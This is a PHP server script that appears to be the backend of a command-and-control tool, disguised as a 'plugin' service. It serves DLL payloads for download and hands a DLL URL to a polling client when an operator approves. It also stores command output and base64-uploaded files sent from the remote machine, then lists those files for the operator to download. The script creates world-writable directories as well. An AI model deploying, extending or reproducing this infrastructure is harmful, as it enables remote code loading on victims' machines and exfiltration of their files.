<?php
// Error and debugging configuration
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error.log');

// Constants and configuration
define('UPLOAD_DIR', __DIR__ . '/uploads/');
define('STATE_FILE', __DIR__ . '/plugin_state.json');

// Create required directories
if (!file_exists(UPLOAD_DIR)) {
    mkdir(UPLOAD_DIR, 0777, true);
    chmod(UPLOAD_DIR, 0777);
}

// Initialize or load state file
function initializeState() {
    if (!file_exists(STATE_FILE)) {
        $initial_state = [
            "requested" => false,
            "response" => null,
            "last_command_output" => null,
            "status" => null,
            "file_info" => null,
            "last_execution_type" => null,
            "timestamp" => time()
        ];
        file_put_contents(STATE_FILE, json_encode($initial_state));
        chmod(STATE_FILE, 0666);
    }
}

initializeState();

// Function to safely handle file uploads
function handleFileUpload($fileData, $fileName) {
    $cleanFileName = preg_replace('/[^a-zA-Z0-9._-]/', '', basename($fileName));
    $savedFileName = time() . '_' . $cleanFileName;
    $filePath = UPLOAD_DIR . $savedFileName;

    if (file_put_contents($filePath, $fileData)) {
        return [
            'original_name' => $cleanFileName,
            'saved_name' => $savedFileName,
            'saved_path' => $filePath,
            'size' => strlen($fileData),
            'timestamp' => time()
        ];
    }
    return null;
}

// Function to safely read state file
function getState() {
    if (!file_exists(STATE_FILE)) {
        initializeState();
    }
    $content = file_get_contents(STATE_FILE);
    return json_decode($content, true) ?: [];
}

// Function to safely write state file
function saveState($state) {
    return file_put_contents(STATE_FILE, json_encode($state));
}

// Handle all endpoints
$requestUri = $_SERVER['REQUEST_URI'];
$requestMethod = $_SERVER['REQUEST_METHOD'];

// Serve the DLL file
if ($requestUri === '/get-dll') {
    $dllPath = __DIR__ . '/mydll.dll';

    if (file_exists($dllPath)) {
        header('Content-Type: application/x-msdownload');
        header('Content-Disposition: attachment; filename="mydll.dll"');
        header('Content-Length: ' . filesize($dllPath));
        header('Cache-Control: no-cache, must-revalidate');
        header('Pragma: no-cache');
        readfile($dllPath);
        exit;
    } else {
        http_response_code(404);
        echo "DLL file not found";
        exit;
    }
}

// Serve the DLL2 file
// Use more if required
if ($requestUri === '/get-dll2') {
    $dllPath = __DIR__ . '/mydll2.dll';

    if (file_exists($dllPath)) {
        header('Content-Type: application/x-msdownload');
        header('Content-Disposition: attachment; filename="mydll2.dll"');
        header('Content-Length: ' . filesize($dllPath));
        header('Cache-Control: no-cache, must-revalidate');
        header('Pragma: no-cache');
        readfile($dllPath);
        exit;
    } else {
        http_response_code(404);
        echo "DLL file not found";
        exit;
    }
}

// Show current state and files
if ($requestUri === '/show-response') {
    header('Content-Type: application/json');
    $state = getState();

    // Add file listing
    if (file_exists(UPLOAD_DIR)) {
        $files = array_diff(scandir(UPLOAD_DIR), array('.', '..'));
        $fileDetails = [];
        foreach ($files as $file) {
            $filePath = UPLOAD_DIR . $file;
            $fileDetails[$file] = [
                'size' => filesize($filePath),
                'modified' => date("Y-m-d H:i:s", filemtime($filePath)),
                'download_url' => '/download/' . urlencode($file)
            ];
        }
        $state['files'] = $fileDetails;
    }

    echo json_encode($state, JSON_PRETTY_PRINT);
    exit;
}

// Handle plugin request
if ($requestUri === '/plugin-request' && $requestMethod === 'POST') {
    header('Content-Type: application/json');

    try {
        $state = getState();
        $state['requested'] = true;
        $state['timestamp'] = time();
        saveState($state);

        $timeout = 10;
        $startTime = time();

        while (time() - $startTime < $timeout) {
            clearstatcache();
            $state = getState();

            if (!empty($state['response'])) {
                // Validate response format
                if ($state['response'] === 'auto' || $state['response'] === 'no' ||
                    (is_string($state['response']) && strpos($state['response'], 'http') === 0)) {

                    if ($state['response'] === 'auto') {
                        $dllUrl = 'https://' . $_SERVER['HTTP_HOST'] . '/get-dll';
                        $response = ["response" => $dllUrl];
                    } else {
                        $response = ["response" => $state['response']];
                    }

                    $state['requested'] = false;
                    saveState($state);
                    echo json_encode($response);
                    exit;
                } else {
                    // Invalid response format, continue waiting
                    $state['response'] = null;
                    saveState($state);
                }
            }

            usleep(500000);
        }

        // Timeout occurred - clear request and return "no"
        $state['requested'] = false;
        $state['response'] = null;
        saveState($state);
        echo json_encode(["response" => "no"]);
        exit;
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(["error" => $e->getMessage()]);
        exit;
    }
}

// Check plugin request status
if ($requestUri === '/get-plugin-request' && $requestMethod === 'GET') {
    header('Content-Type: application/json');
    $state = getState();
    echo json_encode(["requested" => $state['requested']]);
    exit;
}

// Handle plugin response and file upload
if ($requestUri === '/send-plugin-response' && $requestMethod === 'POST') {
    header('Content-Type: application/json');

    try {
        $input = json_decode(file_get_contents('php://input'), true);
        if (!$input) {
            throw new Exception("Invalid JSON data");
        }

        $state = getState();
        $state['response'] = $input['response'] ?? null;
        $state['status'] = $input['status'] ?? null;
        $state['timestamp'] = time();
        $state['last_execution_type'] = $input['output_type'] ?? null;

        // Handle output based on type
        if (isset($input['output'])) {
            $output_type = $input['output_type'] ?? 'unknown';

            switch ($output_type) {
                case 'file':
                    $outputData = json_decode($input['output'], true);
                    if ($outputData && isset($outputData['type']) && $outputData['type'] === 'file') {
                        $fileData = base64_decode($outputData['data']);
                        if ($fileData !== false) {
                            $fileInfo = handleFileUpload($fileData, $outputData['filename']);
                            if ($fileInfo) {
                                $state['file_info'] = $fileInfo;
                            } else {
                                $state['error'] = "Failed to save file";
                            }
                        } else {
                            $state['error'] = "Failed to decode file data";
                        }
                    }
                    break;

                case 'command':
                    if ($input['status'] === 'success') {
                        $state['last_command_output'] = [
                            'output' => $input['output'],
                            'timestamp' => time()
                        ];
                    }
                    break;

                case 'error':
                    $state['error'] = $input['output'];
                    break;
            }
        }

        saveState($state);
        echo json_encode(["status" => "success", "message" => "Response processed"]);
        exit;
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(["error" => $e->getMessage()]);
        exit;
    }
}

// File download handler
if (preg_match('/^\/download\/(.+)$/', $requestUri, $matches)) {
    $filename = urldecode($matches[1]);
    $filepath = UPLOAD_DIR . $filename;

    if (file_exists($filepath) && strpos(realpath($filepath), realpath(UPLOAD_DIR)) === 0) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
    } else {
        http_response_code(404);
        echo "File not found or access denied";
    }
    exit;
}

// Include the HTML interfaces (query and default pages)
include('ui.php');
?>
